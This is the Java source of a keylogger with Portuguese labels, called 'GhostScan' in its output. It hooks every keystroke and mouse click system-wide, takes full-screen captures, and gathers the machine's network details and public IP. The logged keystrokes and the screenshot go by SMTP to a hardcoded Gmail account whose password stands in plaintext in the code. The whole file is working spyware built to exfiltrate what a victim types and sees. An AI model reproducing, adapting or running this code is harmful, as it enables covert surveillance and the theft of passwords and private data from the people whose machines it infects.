package key;import java.awt.AWTException;import java.awt.Dimension;import java.awt.Point;import java.awt.Rectangle;import net.jimmc.jshortcut.JShellLink;import java.awt.Robot;import java.awt.Toolkit;import java.io.BufferedReader;import java.io.BufferedWriter;import java.io.File;import java.io.FileWriter;import java.awt.image.BufferedImage;import java.io.BufferedReader;import java.io.File;import java.io.IOException;import java.io.InputStreamReader;import java.net.Inet4Address;import java.net.InetAddress;import java.net.InterfaceAddress;import java.net.NetworkInterface;import java.net.SocketException;import java.net.URL;import java.net.UnknownHostException;import java.util.ArrayList;import java.util.Enumeration;import java.util.List;import javax.imageio.ImageIO;import org.apache.commons.mail.DefaultAuthenticator;import org.apache.commons.mail.EmailAttachment;import org.apache.commons.mail.EmailException;import org.apache.commons.mail.HtmlEmail;import org.jnativehook.GlobalScreen;import org.jnativehook.NativeHookException;import org.jnativehook.keyboard.NativeKeyEvent;import org.jnativehook.keyboard.NativeKeyListener;import org.jnativehook.mouse.NativeMouseEvent;import org.jnativehook.mouse.NativeMouseInputListener;import java.util.Date;import java.text.DateFormat;import java.text.SimpleDateFormat;public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {private static Point mou;private static String mouse;private static String var;private static String varchar;private static GlobalScreen global;private String getDateTime() {DateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");Date date = new Date();return dateFormat.format(date);}private static String getIP(){String ip = "Não definido";try {URL whatismyip = new URL("http://checkip.amazonaws.com");BufferedReader in = null;in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));ip = in.readLine();} catch (IOException e) {}return ip;}public void nativeMouseReleased(NativeMouseEvent arg0) {}public void nativeMouseDragged(NativeMouseEvent arg0) {}public void nativeMouseMoved(NativeMouseEvent es) {}public void nativeMouseClicked(NativeMouseEvent es) {}public void nativeKeyPressed(NativeKeyEvent e) {	if(e.getKeyCode() == NativeKeyEvent.VK_1){var = "1";}if(e.getKeyCode() == NativeKeyEvent.VK_2){var = "2";}if(e.getKeyCode() == NativeKeyEvent.VK_3){var = "3";}if(e.getKeyCode() == NativeKeyEvent.VK_4){var = "4";}if(e.getKeyCode() == NativeKeyEvent.VK_5){var = "5";}if(e.getKeyCode() == NativeKeyEvent.VK_6){var = "6";}if(e.getKeyCode() == NativeKeyEvent.VK_7){var = "7";}if(e.getKeyCode() == NativeKeyEvent.VK_8){var = "8";}if(e.getKeyCode() == NativeKeyEvent.VK_9){var = "9";}if(e.getKeyCode() == NativeKeyEvent.VK_0){var = "0";}if(e.getKeyCode() == NativeKeyEvent.VK_SPACE){var = " ";}if(e.getKeyCode() == NativeKeyEvent.VK_ENTER){var = "<br>";}if(e.getKeyCode() == NativeKeyEvent.VK_BACK_SPACE){var = "[backspace]";}if(e.getKeyCode() == NativeKeyEvent.VK_TAB){var = "[tab]";}if(e.getKeyCode() == NativeKeyEvent.VK_COMMA){var = ",";}if(e.getKeyCode() == NativeKeyEvent.VK_PERIOD){var = ".";}if(e.getKeyCode() == NativeKeyEvent.VK_UP){var = "[cima]";}if(e.getKeyCode() == NativeKeyEvent.VK_DOWN){var = "[baixo]";}if(e.getKeyCode() == NativeKeyEvent.VK_LEFT){var = "[esquerda]";}if(e.getKeyCode() == NativeKeyEvent.VK_RIGHT){var = "[direita]";}if(e.getKeyCode() == NativeKeyEvent.VK_CAPS_LOCK){var = "[capslock]";}if(e.getKeyCode() == NativeKeyEvent.VK_DELETE){var = "[delete]";}if(e.getKeyCode() == NativeKeyEvent.VK_INSERT){var = "[insert]";}if(e.getKeyCode() == NativeKeyEvent.VK_ADD){var = "+";}if(e.getKeyCode() == NativeKeyEvent.VK_SUBTRACT){var = "-";}if(e.getKeyCode() == NativeKeyEvent.VK_DIVIDE){var = "/";}if(e.getKeyCode() == NativeKeyEvent.VK_MULTIPLY){var = "*";}if(e.getKeyCode() == NativeKeyEvent.VK_EQUALS){var = "=";}if(e.getKeyCode() == NativeKeyEvent.VK_SLASH){var = "/";}if(e.getKeyCode() == NativeKeyEvent.VK_A){var = "a";}if(e.getKeyCode() == NativeKeyEvent.VK_B){var = "b";}if(e.getKeyCode() == NativeKeyEvent.VK_C){var = "c";}if(e.getKeyCode() == NativeKeyEvent.VK_D){var = "d";}if(e.getKeyCode() == NativeKeyEvent.VK_E){var = "e";}if(e.getKeyCode() == NativeKeyEvent.VK_F){var = "f";}if(e.getKeyCode() == NativeKeyEvent.VK_G){var = "g";}if(e.getKeyCode() == NativeKeyEvent.VK_H){var = "h";}if(e.getKeyCode() == NativeKeyEvent.VK_I){var = "i";}if(e.getKeyCode() == NativeKeyEvent.VK_J){var = "j";}if(e.getKeyCode() == NativeKeyEvent.VK_K){var = "k";}if(e.getKeyCode() == NativeKeyEvent.VK_L){var = "l";}if(e.getKeyCode() == NativeKeyEvent.VK_M){var = "m";}if(e.getKeyCode() == NativeKeyEvent.VK_N){var = "n";}if(e.getKeyCode() == NativeKeyEvent.VK_O){var = "o";}if(e.getKeyCode() == NativeKeyEvent.VK_P){var = "p";}if(e.getKeyCode() == NativeKeyEvent.VK_Q){var = "q";}if(e.getKeyCode() == NativeKeyEvent.VK_R){var = "r";}if(e.getKeyCode() == NativeKeyEvent.VK_S){var = "s";}if(e.getKeyCode() == NativeKeyEvent.VK_T){var = "t";}if(e.getKeyCode() == NativeKeyEvent.VK_U){var = "u";}if(e.getKeyCode() == NativeKeyEvent.VK_V){var = "v";}if(e.getKeyCode() == NativeKeyEvent.VK_W){var = "w";}if(e.getKeyCode() == NativeKeyEvent.VK_X){var = "x";}if(e.getKeyCode() == NativeKeyEvent.VK_Y){var = "y";}if(e.getKeyCode() == NativeKeyEvent.VK_Z){var = "z";}varchar += var;}public void nativeKeyReleased(NativeKeyEvent e) {}public void nativeKeyTyped(NativeKeyEvent e) {}public void nativeMousePressed(NativeMouseEvent es) {mou = es.getPoint();double positionx = mou.getX();double positiony = mou.getY();String position = null;String position1 = null;if(positionx < 70 & positiony < 70){position = "canto esquerdo(cabeçalho),";position1 = "(topo, esquerda)";mouse += position+position1;}if(positionx < 170 & positiony > 600){position = "canto esquerdo(Rodapé),";position1 = "(rodapé, esquerda)";mouse += position+position1;}if(positionx < 170 & positiony > 190){position = "lateral esquerda,";position1 = "(meio, esquerda)";mouse += position+position1;}if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){position = "Centro da página,";position1 = "(meio, próximo ao topo e esquerda)";mouse += position+position1;}if(positionx > 270 & positiony > 400 & positionx < 400){position = "Centro da página,";position1 = "(meio, próximo ao rodapé e esquerda)";mouse += position+position1;}if(positionx > 170 & positiony < 190){position = "Topo da página(cabeçalho),";position1 = "(topo, próximo à esquerda)";mouse += position+position1;}if(positionx > 400 & positiony < 190){position = "Topo da página(cabeçalho),";position1 = "(topo, próximo à direita)";mouse += position+position1;}while(varchar.contains(var)){HtmlEmail email = new HtmlEmail();try{email.setHostName("smtp.gmail.com");email.setSmtpPort(465);email.addTo("bftcorporations@gmail.com", "X");email.setFrom("bftcorporations@gmail.com", "X");email.setDebug(true);email.setSSLOnConnect(true);List list = new ArrayList();String info = "Obtendo Informacões da Rede:";InetAddress addr = null;try {addr = InetAddress.getLocalHost();} catch (UnknownHostException e) {e.printStackTrace();}byte[] ipAddr = addr.getAddress();String hostname = addr.getHostName();String computerName = "Nome do Computador completo: "+ hostname;InetAddress localHost = null;try {localHost = Inet4Address.getLocalHost();} catch (UnknownHostException e) {e.printStackTrace();}NetworkInterface networkInterface = null;try {networkInterface = NetworkInterface.getByInetAddress(localHost);} catch (SocketException e) {e.printStackTrace();}String placa = "Placa: "+ networkInterface.getDisplayName();String rede = "Rede: " + networkInterface.getInterfaceAddresses();String address1 = null, iface1 = null, bc1 = null, mask1 = null;String infoRede = null;Enumeration ifaces = null;try {ifaces = NetworkInterface.getNetworkInterfaces();} catch (SocketException e) {e.printStackTrace();}while (ifaces.hasMoreElements()) {NetworkInterface iface = (NetworkInterface)ifaces.nextElement();String face = "Obtendo Informacões da interface: "+ iface.getName();iface1 += face+"<br>";for (InterfaceAddress address : iface.getInterfaceAddresses()){String ipAddress = "IP........: " + address.getAddress().toString();address1 += ipAddress+"<br>";String bc = "Broadcast.: " + address.getBroadcast();bc1 += bc+"<br>";String mask = "Máscara...: " + address.getNetworkPrefixLength(); mask1 += mask+"<br>";}}try{Robot robot = new Robot();Toolkit toolkit = Toolkit.getDefaultToolkit();final Dimension dimension = toolkit.getScreenSize();BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0, dimension.width, dimension.height));try{ImageIO.write(bi, "JPEG", new File("camera.JPEG"));}catch(IOException ey){ey.printStackTrace();}}catch (AWTException e) {e.printStackTrace();}String getIp = getIP();StringBuilder builder = new StringBuilder();builder.append("<html>"+"<body>"+"<h1>GhostScan - "+getDateTime()+"-"+hostname+"</h1>"+"<p><font color='green'>teclado: </font> "+varchar+"</p>"+"</body>"+"</html>");email.setHtmlMsg(builder.toString());}catch (EmailException e1) {e1.printStackTrace();}EmailAttachment anexo = new EmailAttachment();anexo.setPath("camera.JPEG");anexo.setDisposition(EmailAttachment.ATTACHMENT);anexo.setName("camera.JPEG");try {email.attach(anexo);} catch (EmailException e) {e.printStackTrace();}email.setSubject("GhostScan");email.setSSL(true);email.setAuthenticator( new DefaultAuthenticator( "bftcorporations@gmail.com", "BruteForce001"));try {email.send();}catch (EmailException e1) {e1.printStackTrace();}varchar = null;mouse = null;}}public static void main(String[] args) throws EmailException, IOException{System.out.println();Date date = new Date();String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);System.out.println();String ocult = null;try {GlobalScreen.registerNativeHook();} catch (NativeHookException ex) {System.err.println(ex.getMessage());System.exit(1);}try {global.registerNativeHook();global.addNativeKeyListener(new KeyLogger());} catch (NativeHookException e) {e.printStackTrace();System.exit(1);}}}